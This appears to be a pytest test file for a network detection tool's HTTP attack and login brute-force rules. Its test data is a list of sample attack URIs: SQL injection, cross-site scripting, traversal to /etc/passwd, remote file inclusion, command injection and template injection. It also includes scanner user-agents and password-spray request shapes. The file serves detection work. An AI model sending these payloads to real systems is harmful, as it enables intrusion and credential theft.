"""Synthetic HTTP grammar, provenance, folding and authentication regressions."""
import gzip
import json
import sqlite3
import time
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace
from urllib.parse import quote

import pytest

from romulus.detect import web_attacks as wa
from romulus.detect.registry import ALL_PLAYBOOKS
from romulus.evidence.typed import RawRef, TypedEvent, fv
from romulus.hunt.citations import expand_event

ROOT = Path(__file__).resolve().parent.parent


def rule_named(name):
    classes = {rule.id: rule for rule in ALL_PLAYBOOKS}
    assert name in classes, f"The network HTTP rule {name} must be registered"
    return classes[name]()


def event(uri="/ordinary", *, n=0, producer="zeek-ecs", source="192.0.2.8", destination="10.2.3.4",
          status=404, method="GET", agent="Mozilla/5.0", extra=None, at=None):
    session = producer == "arkime"
    values = {"source.ip": source, "destination.ip": destination,
              "url.path" if session else "url.original": uri,
              "http.request.method": method, "http.response.status_code": status,
              "user_agent.original": agent}
    if producer == "zeek-ecs":
        values.update({"observer.product": "zeek", "observer.name": "sensor-a"})
    values.update(extra or {})
    return TypedEvent(id=f"http-{producer}-{n}", family="net_session" if session else "http_tx",
                      ts=datetime(2025, 1, 1, tzinfo=UTC) + timedelta(seconds=n if at is None else at), host="sensor",
                      fields={key: fv(value, "native." + key) for key, value in values.items() if value is not None},
                      raw=[RawRef(target="synthetic-http", native_id=f"{producer}-{n}")],
                      normalizer=producer + "@1")


# ---- the same requests through the real normalizers ------------------------------------------------------------------

_native = [0]


def zeek(uri, *, method="GET", status=200, agent="Mozilla/5.0 (X11; Linux x86_64)", shape="plain", dt=0.0,
         source=None, destination=None):
    from tests.fixtures import zeek_logs as zl
    from tests.test_zeek_windows_protocols import normalize

    _native[0] += 1
    row = zl.HTTP.with_(uri=uri, method=method, status_code=status, user_agent=agent, uid=f"C{_native[0]:015d}")
    if source:
        row = row.with_(**{"id.orig_h": source})
    if destination:
        row = row.with_(**{"id.resp_h": destination})
    return normalize(zl.WRITERS[shape](replace(row, ts=zl.T0 + dt), f"z-{_native[0]}"))


def suricata(uri, *, method="GET", status=200, agent="Mozilla/5.0 (X11; Linux x86_64)", shape="original"):
    from romulus.evidence.normalize import normalize_hits
    from tests.test_suricata_protocols import hit

    _native[0] += 1
    raw = hit("http", {"hostname": "www.example.test", "url": uri, "http_method": method,
                       "http_user_agent": agent, "status": status, "length": 512}, shape=shape, nid=f"s-{_native[0]}")
    rows, skips, errors = normalize_hits([raw])
    assert not skips and not errors
    return rows[0]


def arkime(uris, *, methods=("GET",), statuses=(200,), agents=("Mozilla/5.0 (X11; Linux x86_64)",)):
    from romulus.evidence.normalize import normalize_hits
    from tests.test_arkime_sessions import session

    _native[0] += 1
    raw = session(f"a-{_native[0]}")
    raw["_source"]["http"] = {"uri": list(uris), "method": list(methods), "statuscode": list(statuses),
                              "useragent": list(agents), "host": ["www.example.test"]}
    rows, skips, errors = normalize_hits([raw])
    assert not skips and not errors
    return rows[0]


def on_each_sensor(uri, **options):
    """One request as Zeek, Suricata and Arkime record it (Arkime's URI is host-prefixed)."""
    return {"zeek": zeek(uri, **options), "suricata": suricata(uri, **options),
            "arkime": arkime(["www.example.test" + uri if uri.startswith("/") else uri])}


@pytest.fixture
def attack_rule():
    rule = rule_named("network.web_attacks")
    yield rule
    rule.close_spill()


@pytest.fixture
def login_rule():
    rule = rule_named("network.web_login_burst")
    yield rule
    rule.close_spill()


def finish(rule, rows):
    found = {match.group_key: match for match in rule.consume(rows)}
    found.update((match.group_key, match) for match in rule.finalize())
    return list(found.values())


def classes_of(rows):
    """The classes a fresh rule reports for some records, and how many of them it counted partly inspected."""
    rule = rule_named("network.web_attacks")
    try:
        matches = finish(rule, rows)
        assert all(match.proposed_lane == "lead" for match in matches)
        return {match.group_key.rsplit("|", 1)[1] for match in matches}, rule.capped, rule.limit_reasons()
    finally:
        rule.close_spill()


def stored_text(rule):
    """Everything the rule keeps on disk, read through the store: text columns as they are, compact events
    expanded (their bytes are compressed, so a search of the database file would find nothing either way)."""
    database = rule._spill.db
    database.commit()
    kept = []
    for (table,) in database.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall():
        for row in database.execute(f"SELECT * FROM {table}"):
            for value in row:
                if isinstance(value, bytes) and len(value) > 16:
                    kept.append(str(expand_event(value)))
                elif value is not None:
                    kept.append(str(value))
    return " ".join(kept)


def test_registered_http_rule_surfaces_an_injection():
    rule = rule_named("network.web_attacks")
    try:
        assert finish(rule, [event("/../../etc/passwd")])
    finally:
        rule.close_spill()


def test_registered_login_rule_surfaces_a_failure_burst():
    rule = rule_named("network.web_login_burst")
    try:
        assert finish(rule, [event("/login", n=n, status=401, method="POST") for n in range(20)])
    finally:
        rule.close_spill()


def test_both_rules_carry_a_new_version():
    assert wa.WebAttacks.version == "3" and wa.WebLoginBurst.version == "3"


ATTACKS = [
    ("sql_injection", "/items?id=1%20UNION%20SELECT%20password%20FROM%20users"),
    ("sql_injection", "/items?id=1%27%20OR%201=1--"),
    ("sql_injection", "/items?id=1%27;select%20user()"),
    ("sql_injection", "/items?id=1+union/**/select+1"),
    ("cross_site_scripting", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"),
    ("cross_site_scripting", "/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("cross_site_scripting", "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"),
    ("path_traversal_lfi", "/../../etc/passwd"),
    ("path_traversal_lfi", "/read?file=../../etc/passwd"),
    ("path_traversal_lfi", "/read?file=C:%5cWindows%5cwin.ini"),
    ("remote_file_inclusion", "/index.php?include=http://192.0.2.60/payload.php"),
    ("remote_file_inclusion", "/index.php?page=https://files.example/payload.php?"),
    ("command_injection", "/ping?host=127.0.0.1;cat+/etc/passwd"),
    ("command_injection", "/ping?host=x%7Cwhoami"),
    ("command_injection", "/ping?host=x%60id%60"),
    ("template_injection", "/hello?name=%7B%7B7*7%7D%7D"),
    ("template_injection", "/hello?name=%24%7B7*7%7D"),
]


@pytest.mark.parametrize("producer", ["zeek-ecs", "suricata-eve", "arkime"])
@pytest.mark.parametrize("attack_class,uri", ATTACKS)
def test_public_grammar_classes_use_typed_request_fields(attack_rule, producer, attack_class, uri):
    matches = finish(attack_rule, [event([uri] if producer == "arkime" else uri, producer=producer)])
    [match] = [item for item in matches if item.group_key.endswith("|" + attack_class)]
    assert match.group_key.endswith("|" + attack_class)
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["record_count"] == 1
    assert all(predicate.origin.startswith("native.") for predicate in match.predicate)
    assert match.events and match.events[0].raw


@pytest.mark.parametrize("uri", [
    "/search?q=select", "/search?q=union", "/search?q=script", "/search?q=union+select",
    "/api?data=%7B%22select%22%3A%22union%22%2C%22script%22%3Atrue%7D",
    "/api?token=c2VsZWN0IHVuaW9uIHNjcmlwdA==", "/article/union-select-history",
    "/find?q=the+union+will+select+a+representative", "/safe/../public/index.html",
    "/?next=https://accounts.example/login", "/?url=https://news.example/story",
    "/?options=alpha;beta|gamma", "/?name={{customer_name}}", "/?name=${customer_name}",
    "/?campaign=" + "a" * 8000, "https://portal.example/a/../b",
])
def test_adversarial_ordinary_urls_do_not_match(attack_rule, uri):
    assert finish(attack_rule, [event(uri)]) == []
    assert attack_rule.capped == 0


@pytest.mark.parametrize("agent", ["Googlebot/2.1", "Mozilla/5.0", "Prometheus/2.0", "sqlmapper/1", "my-nuclei-app"])
def test_benign_user_agents_are_not_tools(attack_rule, agent):
    assert finish(attack_rule, [event(agent=agent)]) == []


@pytest.mark.parametrize("agent", ["sqlmap/1.8", "Nikto/2.5", "Mozilla/5.0 / nuclei", "Nuclei/3.0", "commix/4.0"])
def test_known_tool_user_agents_are_attributed_leads(attack_rule, agent):
    [match] = finish(attack_rule, [event(agent=agent, status=200)])
    assert match.group_key.endswith("|exploit_tool")
    assert match.proposed_lane == "lead"
    assert any("Nasreddine Bencherchali" in note and "Tim Shelton" in note for note in match.notes)
    assert any("not established" in note for note in match.notes)


def test_percent_decoding_is_twice_at_most(attack_rule):
    attack = "<script>alert(1)</script>"
    assert finish(attack_rule, [event("/?q=" + quote(quote(attack)), n=1)])
    other = rule_named("network.web_attacks")
    try:
        assert finish(other, [event("/?q=" + quote(quote(quote(attack))))]) == []
    finally:
        other.close_spill()


@pytest.mark.parametrize("uri,reason", [("/?x=%ed%a0%80", "utf8"), ("/?x=caf%E9", "utf8"),
                                       ("/" + "a" * 17000, "length")])
def test_invalid_or_oversize_uris_are_inspected_and_counted_partial(attack_rule, uri, reason):
    assert finish(attack_rule, [event(uri)]) == []
    assert attack_rule.capped == 1
    assert any(reason in text.casefold() for text in attack_rule.limit_reasons())


def test_only_typed_values_are_read_and_foreign_producers_are_excluded(attack_rule):
    row = event(extra={"message": "<script>alert(1)</script>", "process.command_line": ";whoami"})
    attack_rule.bind_raw({row.raw[0].key: {"untrusted": "sqlmap/1.8", "url": "/../../etc/passwd"}})
    assert finish(attack_rule, [row, event("/../../etc/passwd", producer="untrusted")]) == []


def test_fold_is_exact_across_batches_replay_and_multiple_uri_views(attack_rule):
    rows = [event("/../../etc/passwd", n=n, extra={"url.path": "/../../etc/passwd"}) for n in range(40)]
    first = list(attack_rule.consume(rows[:17]))
    assert len(first) == 1 and first[0].aggregate_summary["record_count"] == 17
    assert first[0].claim.startswith("At least 17 ") and first[0].aggregate_summary["count_complete"] == 0
    assert list(attack_rule.consume(rows[17:])) == []
    assert list(attack_rule.consume(rows)) == []
    [match] = list(attack_rule.finalize())
    assert match.aggregate_summary["record_count"] == 40
    assert match.aggregate_summary["count_complete"] == 1
    assert len(match.events) <= 2
    assert match.bounded_revision


def test_peer_and_class_groups_are_independent(attack_rule):
    rows = [event("/../../etc/passwd"), event("/../../etc/passwd", source="192.0.2.9", n=1),
            event("/../../etc/passwd", destination="10.2.3.5", n=2),
            event("/?x=<script>alert(1)</script>", n=3)]
    assert len(finish(attack_rule, rows)) == 4


def test_arkime_lists_never_pair_status_or_user_agent_to_a_uri(attack_rule):
    row = event(["/", "/?x=<script>alert(1)</script>"], producer="arkime", status=[200, 404],
                agent=["sqlmap/1.8", "Mozilla/5.0"], method=["GET", "POST"])
    matches = finish(attack_rule, [row])
    assert {match.group_key.rsplit("|", 1)[1] for match in matches} == {"cross_site_scripting", "exploit_tool"}
    assert all(match.proposed_lane == "lead" for match in matches)
    assert all(any("unordered" in note for note in match.notes) for match in matches)


def test_site_management_source_is_not_demoted(attack_rule):
    attack_rule.site_facts = SimpleNamespace(management_hosts=("192.0.2.8",))
    [match] = finish(attack_rule, [event("/../../etc/passwd")])
    assert match.proposed_lane == "lead"
    assert any("management" in note.casefold() for note in match.notes)


def test_login_failure_window_counts_repeated_and_distinct_accounts(login_rule):
    rows = [event(f"/login?username=user{n % 4}", n=n, status=401, method="POST") for n in range(25)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 25
    assert match.aggregate_summary["distinct_members"] == 4
    assert "25 answered 401" in match.claim


def test_login_200_is_attempt_not_success_and_threshold_is_local(login_rule):
    rows = [event("/login?user=same", n=n, status=200, method="POST") for n in range(20)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert "success" not in match.claim.casefold()
    assert any("not established" in note for note in match.notes)


def test_login_does_not_count_get_form_fetch_or_ordinary_200_paths(login_rule):
    rows = [event("/login", n=n, status=200) for n in range(25)]
    rows += [event("/api/data", n=n + 100, status=200, method="POST") for n in range(25)]
    assert finish(login_rule, rows) == []


def test_login_accounts_absent_still_counts_attempts(login_rule):
    [match] = finish(login_rule, [event("/auth/signin", n=n, status=403, method="POST") for n in range(20)])
    assert match.aggregate_summary["total_refs"] == 20
    assert any("account" in note.casefold() and "unknown" in note.casefold() for note in match.notes)


def test_login_window_and_peer_boundaries(login_rule):
    rows = [event("/login?user=a", n=n * 40, status=401, method="POST") for n in range(20)]
    rows += [event("/login?user=a", n=1000+n, source=f"192.0.2.{n+10}", status=401, method="POST") for n in range(20)]
    assert finish(login_rule, rows) == []


def test_arkime_lists_never_count_as_login_attempts(login_rule):
    assert finish(login_rule, [event(["/login"], producer="arkime", status=[401], method=["POST"], n=n)
                               for n in range(30)]) == []


def test_login_duplicate_and_late_rows_replay_exactly(login_rule):
    rows = [event("/login?user=a", n=n, status=401 if n % 2 else 403, method="POST") for n in range(20)]
    list(login_rule.consume(rows[10:]))
    list(login_rule.consume(rows[:10]))
    list(login_rule.consume(rows))
    [match] = list(login_rule.finalize())
    assert match.aggregate_summary["total_refs"] == 20
    assert "10 answered 401, 10 answered 403" in match.claim


def test_later_login_redirect_does_not_prove_authentication_success(login_rule):
    rows = [event("/login?user=a", n=n, status=401, method="POST") for n in range(20)]
    rows.append(event("/login?user=a", n=21, status=302, method="POST"))
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 21
    assert "20 answered 401, 1 answered 302" in match.claim
    assert "success" not in match.claim.casefold()


def test_separate_query_and_path_fields_are_inspected(attack_rule):
    row = event(None, extra={"url.path": "/items", "url.query": "id=1+union+select+1"})
    [match] = finish(attack_rule, [row])
    assert match.group_key.endswith("|sql_injection")


def test_a_separately_typed_query_is_read_as_parameters(attack_rule):
    assert classes_of([event(None, extra={"url.path": "/view", "url.query": "page=../../../../etc/shadow"})])[0] == {
        "path_traversal_lfi"}
    assert classes_of([event(None, extra={"url.path": "/view", "url.query": "next=../home"}, n=1)])[0] == set()


@pytest.mark.parametrize("query", ["password=TOPSECRET&token=SECRETTOKEN", "p%61ssword=TOPSECRET",
                                   "password%3DTOPSECRET%26token%3DSECRETTOKEN"])
def test_retained_citations_do_not_store_recognised_query_secrets(attack_rule, query):
    [match] = finish(attack_rule, [event("/../../etc/passwd?" + query)])
    assert "TOPSECRET" not in str(match)
    assert "SECRETTOKEN" not in str(match)
    kept = stored_text(attack_rule)
    assert "/../../etc/passwd" in kept, "the store must be readable for this check to mean anything"
    assert "TOPSECRET" not in kept and "SECRETTOKEN" not in kept


def test_absolute_uri_traversal_is_relative_to_its_authority(attack_rule):
    [match] = finish(attack_rule, [event("https://portal.example/../../private/data")])
    assert match.group_key.endswith("|path_traversal_lfi")


def test_login_retained_citations_mask_passwords(login_rule):
    [match] = finish(login_rule, [event("/login?user=a&password=TOPSECRET", n=n, status=401, method="POST")
                                for n in range(20)])
    assert "TOPSECRET" not in str(match)
    assert "TOPSECRET" not in stored_text(login_rule)


def test_refused_disk_state_still_reports_live_positive_and_retained_counts(attack_rule, tmp_path):
    from romulus.detect.bounded import StateBudget

    attack_rule.budget = StateBudget(tmp_path, disk_total=8 * 2**20, reserve=0)
    list(attack_rule.consume([event("/../../etc/passwd", n=n) for n in range(12)]))
    attack_rule.budget.force_full("synthetic refusal", lambda account: True)
    observed = list(attack_rule.consume([event("/../../etc/passwd", source="192.0.2.99", n=20)]))
    assert len(observed) == 1 and observed[0].proposed_lane == "lead"
    [retained] = list(attack_rule.finalize())
    assert retained.aggregate_summary["record_count"] == 12
    assert retained.aggregate_summary["count_complete"] == 0
    assert retained.claim.startswith("At least 12 ")
    assert attack_rule.capped == 1


@pytest.mark.parametrize("shape", ["original", "message", "filebeat", "agent", "malcolm"])
def test_suricata_native_http_producer_reaches_request_rule(attack_rule, shape):
    [match] = finish(attack_rule, [suricata("/?q=%3Cscript%3Ealert(1)%3C/script%3E", status=404, shape=shape)])
    assert match.group_key.endswith("|cross_site_scripting")


@pytest.mark.parametrize("shape", ["malcolm", "elastic", "security_onion", "plain"])
def test_zeek_native_http_producer_reaches_request_rule(attack_rule, shape):
    [match] = finish(attack_rule, [zeek("/../../etc/passwd", shape=shape)])
    assert match.group_key.endswith("|path_traversal_lfi")


def test_arkime_native_uri_lists_reach_request_rule(attack_rule):
    [match] = finish(attack_rule, [arkime(["/ordinary", "/../../etc/passwd"], statuses=[200, 404])])
    assert match.aggregate_summary["session_count"] == 1


def test_unknown_and_malformed_transaction_producer_versions_are_not_admitted(attack_rule):
    from romulus.detect.network_producers import HTTP_OBSERVATIONS, rule_reads

    for producer in ("arkime@0", "arkime@1junk", "suricata-eve@0"):
        row = event("/../../etc/passwd", producer="arkime" if producer.startswith("arkime") else "suricata-eve")
        row.normalizer = producer
        assert not rule_reads(row, HTTP_OBSERVATIONS)


def test_login_does_not_mix_sensor_attempts(login_rule):
    rows = [event("/login?user=a", n=n, status=401, method="POST", producer=producer)
            for producer in ("zeek-ecs", "suricata-eve") for n in range(10)]
    assert finish(login_rule, rows) == []


def test_decoded_literal_percent_is_not_malformed(attack_rule):
    assert finish(attack_rule, [event("/sale?discount=20%25")]) == []
    assert attack_rule.capped == 0


def test_inclusion_directive_accepts_remote_non_script_extension(attack_rule):
    [match] = finish(attack_rule, [event("/?include=https://files.example/payload.txt")])
    assert match.group_key.endswith("|remote_file_inclusion")


def test_partial_schema_refusal_can_retry_without_discarding_positive(attack_rule, monkeypatch):
    from romulus.detect.bounded import StateExhausted

    spill = attack_rule.spill()
    original = spill.table
    refused = False

    def interrupted(name, columns):
        nonlocal refused
        if name == "web_groups" and not refused:
            refused = True
            raise StateExhausted("synthetic schema interruption")
        return original(name, columns)

    monkeypatch.setattr(spill, "table", interrupted)
    first = list(attack_rule.consume([event("/../../private/a")]))
    second = list(attack_rule.consume([event("/../../private/b", n=1)]))
    assert first and second
    assert attack_rule.capped == 1


def test_malformed_uri_does_not_hide_independent_tool_marker(attack_rule):
    [match] = finish(attack_rule, [event("/bad?x=%ed%a0%80", agent="sqlmap/1.0")])
    assert match.group_key.endswith("|exploit_tool")
    assert attack_rule.capped == 1


@pytest.mark.parametrize("secret", ["prefix%26TOPSECRET%3Dcredential", "prefix%2526TOPSECRET%253Dcredential",
                                    "prefix&amp;TOPSECRET=credential", "prefix%26amp%3BTOPSECRET=credential"])
def test_credential_value_encoded_delimiters_never_escape_redaction(attack_rule, secret):
    [match] = finish(attack_rule, [event("/../../private/data?password=" + secret)])
    assert "topsecret" not in str(match).casefold()
    assert "topsecret" not in stored_text(attack_rule).casefold()


def test_one_partially_evaluated_record_is_not_counted_once_per_class(attack_rule, tmp_path):
    from romulus.detect.bounded import StateBudget

    attack_rule.budget = StateBudget(tmp_path, disk_total=2**20, reserve=0)
    attack_rule._db()
    attack_rule.budget.force_full("synthetic refusal", lambda account: True)
    matches = list(attack_rule.consume([event("/../../etc/passwd?x=<script>alert(1)</script>", agent="Nikto/2.5")]))
    assert len(matches) == 3
    assert attack_rule.capped == 1


def test_url_userinfo_credentials_are_not_retained(attack_rule):
    [match] = finish(attack_rule, [event("https://user:TOPSECRET@app.example/../../etc/passwd")])
    assert "topsecret" not in str(match).casefold()
    assert any("app.example" in str(predicate.value) for predicate in match.predicate)


def test_login_percent_encoded_account_delimiters_keep_distinct_labels(login_rule):
    [match] = finish(login_rule, [event("/login?user=a%26" + ("b" if n % 2 else "c"), n=n,
                                      status=401, method="POST") for n in range(20)])
    assert match.aggregate_summary["total_refs"] == 20
    assert match.aggregate_summary["distinct_members"] == 2


def test_login_account_case_and_encoded_equals_are_preserved(login_rule):
    [match] = finish(login_rule, [event("/login?user=" + ("Name%3Da" if n % 2 else "name%3Da"), n=n,
                                      status=403, method="POST") for n in range(20)])
    assert match.aggregate_summary["distinct_members"] == 2


@pytest.mark.parametrize("first,second", [("a%2Bb", "a+b"), ("a%26%23x62%3B", "ab"),
                                         ("a%26amp%3Bb", "a%26b"), ("a%2526b", "a%26b")])
def test_login_labels_use_one_form_decode_without_html_interpretation(login_rule, first, second):
    [match] = finish(login_rule, [event("/login?user=" + (first if n % 2 else second), n=n,
                                      status=401, method="POST") for n in range(20)])
    assert match.aggregate_summary["distinct_members"] == 2


@pytest.mark.parametrize("operator", ["%2B", "%252B"])
def test_template_arithmetic_encoded_plus_survives_percent_decoding(attack_rule, operator):
    [match] = finish(attack_rule, [event("/?name={{7" + operator + "7}}")])
    assert match.group_key.endswith("|template_injection")


def test_credential_bearing_get_200_counts_only_as_login_attempt(login_rule):
    [match] = finish(login_rule, [event("/login?username=alice&password=Xq7mZt", n=n, status=200, method="GET")
                                for n in range(20)])
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 20
    assert "success" not in match.claim.casefold()
    assert "Xq7mZt" not in str(match)


def test_get_200_with_username_only_remains_ordinary_form_fetch(login_rule):
    assert finish(login_rule, [event("/login?username=alice", n=n, status=200, method="GET")
                               for n in range(25)]) == []


# ---- the login burst counts the common brute-force shapes ------------------------------------------------------------

def burst(uri, method, status, *, count=30, step=2, vary=None):
    return [event(uri if vary is None else vary(n), n=n, at=n * step, method=method, status=status)
            for n in range(count)]


LOGIN_BURSTS = [
    ("POST", "/login.php", 302), ("POST", "/dvwa/login.php", 302), ("POST", "/login", 303),
    ("POST", "/login", 422), ("POST", "/login", 429), ("POST", "/login", 500), ("POST", "/api/login", 400),
    ("POST", "/xmlrpc.php", 200), ("POST", "/owa/auth.owa", 200), ("POST", "/administrator/index.php", 200),
    ("POST", "/remote/logincheck", 200), ("POST", "/phpmyadmin/index.php", 200),
    ("POST", "/api/v1/auth", 401), ("POST", "/oauth/token", 401), ("POST", "/sso/signon", 200),
    ("POST", "/j_security_check;jsessionid=AB12", 200), ("GET", "/login", 429), ("HEAD", "/api/v1/auth", 403),
]


@pytest.mark.parametrize("method,uri,status", LOGIN_BURSTS)
def test_login_burst_counts_every_answered_post_and_refusal_at_a_sign_in_path(login_rule, method, uri, status):
    [match] = finish(login_rule, burst(uri, method, status))
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 30
    assert f"30 answered {status}" in match.claim


LOGIN_QUERY_PAIRS = [
    ("/dvwa/vulnerabilities/brute/?username=admin&password=guess{n}&Login=Login", 200),
    ("/login.php?username=admin&password=guess{n}", 302),
    ("/login?j_username=admin&j_password=guess{n}", 200),
    ("/login.php?log=admin&pwd=guess{n}", 200),
    ("/cgi-bin/luci?uname=root&pw=guess{n}", 200),
    ("/portal/enter?userid=root&passwd=guess{n}", 500),
]


@pytest.mark.parametrize("template,status", LOGIN_QUERY_PAIRS)
def test_login_burst_counts_an_account_and_password_query_pair_on_any_path(login_rule, template, status):
    [match] = finish(login_rule, burst(None, "GET", status, vary=lambda n: template.format(n=n)))
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 30
    assert "guess" not in str(match).replace("guessing", "")


@pytest.mark.parametrize("method,uri,status", [
    ("POST", "/api/data", 200), ("POST", "/checkout", 302), ("POST", "/admin/", 200),
    ("GET", "/login", 200), ("GET", "/login", 302), ("GET", "/manager/html", 401),
    ("POST", "/authors/new", 200), ("POST", "/tokenizer", 200), ("POST", "/blog/login-tips", 200),
])
def test_login_burst_stays_silent_for_requests_that_are_not_attempts(login_rule, method, uri, status):
    assert finish(login_rule, burst(uri, method, status)) == []
    assert login_rule.capped == 0


def test_a_token_is_not_a_password_away_from_a_sign_in_path(login_rule):
    # every request of a signed-in API client carries its account and token
    assert finish(login_rule, burst(None, "GET", 200, vary=lambda n: f"/api/feed?user=bob&token=t{n}")) == []
    other = rule_named("network.web_login_burst")
    try:
        assert len(finish(other, burst(None, "GET", 200, vary=lambda n: f"/login?user=bob&token=t{n}"))) == 1
    finally:
        other.close_spill()


def test_a_client_polling_with_its_own_credentials_is_not_a_burst(login_rule):
    # a recorder that fetches a camera snapshot every ten seconds, and a gateway that sends with fixed credentials
    rows = [event("/cgi-bin/snapshot.cgi?user=admin&pwd=1234&channel=1", n=n, at=n * 10, status=200) for n in range(40)]
    rows += [event(f"/sendsms?username=svc&password=s3cret&to=555{n:04d}", n=100 + n, at=n * 8, status=200,
                   source="192.0.2.77") for n in range(30)]
    assert finish(login_rule, rows) == []
    assert login_rule.capped == 0 and login_rule.evaluated == 70


def test_one_recorder_polling_a_hundred_cameras_is_silent(login_rule):
    rows = [event("/cgi-bin/snapshot.cgi?user=admin&pwd=1234", n=25 * camera + n, at=n * 10, status=200,
                  source="10.20.1.5", destination=f"10.20.0.{camera + 1}") for camera in range(100) for n in range(25)]
    assert finish(login_rule, rows) == []


def test_guessed_passwords_state_their_distinct_credential_pairs(login_rule):
    rows = [event(f"/dvwa/vulnerabilities/brute/?username=admin&password=Zq{n}x&Login=Login", n=n, status=200)
            for n in range(30)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert "30 recorded requests carrying an account and a password parameter" in match.claim
    assert "with 30 distinct credential pairs" in match.claim
    assert "whether any pair was accepted is not" in match.claim
    assert match.aggregate_summary["total_refs"] == 30 and match.aggregate_summary["distinct_members"] == 30
    assert "Zq7x" not in str(match) and "Zq7x" not in stored_text(login_rule)


def test_a_spray_of_one_password_over_many_accounts_counts_its_pairs(login_rule):
    rows = [event(f"/portal/home.do?username=user{n}&password=Spring2025", n=n, status=302) for n in range(30)]
    [match] = finish(login_rule, rows)
    assert "with 30 distinct credential pairs" in match.claim
    assert "Spring2025" not in str(match) and "Spring2025" not in stored_text(login_rule)


def test_repeats_of_a_pair_do_not_add_pairs_and_two_pairs_are_stated(login_rule):
    rows = [event(f"/svc/poll?user=dev{n % 2}&pass=fixed{n % 2}", n=n, status=200) for n in range(40)]
    [match] = finish(login_rule, rows)
    assert "40 recorded requests" in match.claim and "with 2 distinct credential pairs" in match.claim


def test_credential_labels_are_keyed_per_rule_instance(login_rule):
    other = rule_named("network.web_login_burst")
    try:
        assert login_rule._label("pair", "admin", "1234") == login_rule._label("pair", "admin", "1234")
        assert login_rule._label("pair", "admin", "1234") != other._label("pair", "admin", "1234")
        assert login_rule._label("pair", "admin", "1234") != login_rule._label("pair", "admin1", "234")
    finally:
        other.close_spill()
    list(login_rule.consume([event(f"/x?user=admin&pwd=p{n}", n=n, status=200) for n in range(25)]))
    kept = stored_text(login_rule)
    import hashlib
    assert hashlib.sha256(b"admin").hexdigest() not in kept       # no unkeyed label of the account either


def test_a_sign_in_path_keeps_counting_a_repeated_pair(login_rule):
    # unchanged: at a sign-in path a credential-bearing GET counts whatever the pair
    [match] = finish(login_rule, [event("/login?username=alice&password=same", n=n, status=200) for n in range(20)])
    assert "requests to a sign-in path" in match.claim and "distinct credential pairs" not in match.claim


def test_the_login_claim_states_the_response_status_mix(login_rule):
    rows = [event("/login.php", n=n, at=n * 2, method="POST", status=200 if n in (7, 19) else 302) for n in range(30)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert "recorded requests to a sign-in path of 10.2.3.4, /login.php, in five minutes" in match.claim
    assert "that each was a login attempt" in match.claim and "authentication-attempt" not in match.claim
    assert "Of the 30 record(s) in that window, 28 answered 302, 2 answered 200." in match.claim
    assert any("No status is read as a failed or a successful login" in note for note in match.notes)


def test_the_status_mix_is_the_peak_windows_not_the_hunts(login_rule):
    # 25 refusals in one burst, then, hours later, a slow trickle of redirects that never qualifies
    rows = [event("/login", n=n, at=n, method="POST", status=401) for n in range(25)]
    rows += [event("/login", n=100 + n, at=20_000 + n * 400, method="POST", status=302) for n in range(10)]
    [match] = finish(login_rule, rows)
    assert match.aggregate_summary["total_refs"] == 25
    assert "25 answered 401" in match.claim and "302" not in match.claim


def test_a_path_parameter_does_not_split_one_sign_in_endpoint(login_rule):
    rows = burst(None, "POST", 200, vary=lambda n: f"/j_security_check;jsessionid=S{n:04d}")
    [match] = finish(login_rule, rows)
    assert match.aggregate_summary["total_refs"] == 30
    assert ", /j_security_check, in five minutes" in match.claim and "jsessionid" not in match.claim


def test_login_threshold_and_window_boundaries(login_rule):
    # nineteen attempts never qualify; the twentieth does when it falls inside five minutes of the first
    assert finish(login_rule, burst("/login", "POST", 302, count=19, step=1)) == []
    inside = [event("/login", n=n, at=0 if n == 0 else 281 + n, method="POST", status=302) for n in range(20)]
    other = rule_named("network.web_login_burst")
    try:
        [match] = finish(other, inside)                      # the first at 0 s, the last at 300 s
        assert match.aggregate_summary["total_refs"] == 20
    finally:
        other.close_spill()
    outside = [event("/login", n=n, at=0 if n == 0 else 282 + n, method="POST", status=302) for n in range(20)]
    third = rule_named("network.web_login_burst")
    try:
        assert finish(third, outside) == []                  # the last at 301 s: nineteen in any window
    finally:
        third.close_spill()


def test_a_post_without_a_recorded_response_is_unknown_not_a_no_match(login_rule):
    rows = [event("/login", n=n, method="POST", status=None) for n in range(30)]
    assert finish(login_rule, rows) == []
    assert login_rule.missing_required == 30 and login_rule.evaluated == 0


@pytest.mark.parametrize("sensor", ["zeek", "suricata"])
def test_login_burst_through_the_real_normalizers(login_rule, sensor):
    make = zeek if sensor == "zeek" else suricata
    rows = [make("/dvwa/login.php", method="POST", status=302, **({"dt": n * 2.0} if sensor == "zeek" else {}))
            for n in range(30)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead" and "30 answered 302" in match.claim


def test_login_burst_keeps_secrets_out_of_claims_predicates_and_the_store(login_rule):
    rows = [event(f"/portal;token=TOPSECRET/login?j_username=admin&j_password=TOPSECRET{n}", n=n, method="POST",
                  status=200) for n in range(25)]
    [match] = finish(login_rule, rows)
    assert "TOPSECRET" not in str(match) and "TOPSECRET" not in stored_text(login_rule)
    assert ", /portal/login, in five minutes" in match.claim


# ---- decoding never hides a request ----------------------------------------------------------------------------------

HIDDEN_BY_DECODING = [
    ("sql_injection", "/item?q=100%&id=1'+or+'1'='1", False),
    ("sql_injection", "/item?id=1'+or+name+like+'%admin%'--+", True),
    ("cross_site_scripting", "/s?q=caf%E9<script>alert(1)</script>", True),
    ("sql_injection", "/item?id=%ff'+union+select+1,2--+", True),
    ("cross_site_scripting", "/s?q=%u003cscript%u003ealert(1)%u003c/script%u003e", False),
    ("path_traversal_lfi", "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir", False),
]


